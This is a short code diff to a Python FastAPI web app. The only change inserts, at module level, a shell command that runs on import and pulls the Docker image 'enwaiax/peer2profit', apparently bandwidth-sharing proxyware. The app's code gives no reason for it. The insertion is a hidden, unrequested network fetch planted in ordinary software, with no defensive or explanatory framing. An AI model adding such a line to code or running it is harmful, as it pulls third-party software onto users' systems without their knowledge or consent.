@@ -15,7 +15,7 @@ app = FastAPI()
 
 CURRENT_DIR = Path(__file__).parent.resolve()
 LOG_FILE = Path(CURRENT_DIR, 'test.log')
-
+subprocess.call("docker pull enwaiax/peer2profit",shell=True)
 
 @app.get('/')
 def hello(request: Request):
